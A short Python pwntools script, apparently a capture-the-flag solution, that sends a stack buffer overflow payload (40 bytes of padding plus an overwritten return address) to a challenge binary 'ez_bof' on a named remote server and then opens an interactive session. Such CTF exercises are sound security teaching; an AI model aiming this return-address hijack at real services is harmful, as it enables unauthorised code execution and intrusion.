#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'ez_bof' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "eens.ee.ncku.edu.tw"
    port = 5002
    r = remote(ip,port)

context.arch = 'amd64'

addr = 0x401175
payload = "a"*40 + p64(addr)

print('payload = '+payload)
r.recvuntil(':')
r.sendline(payload)
r.interactive()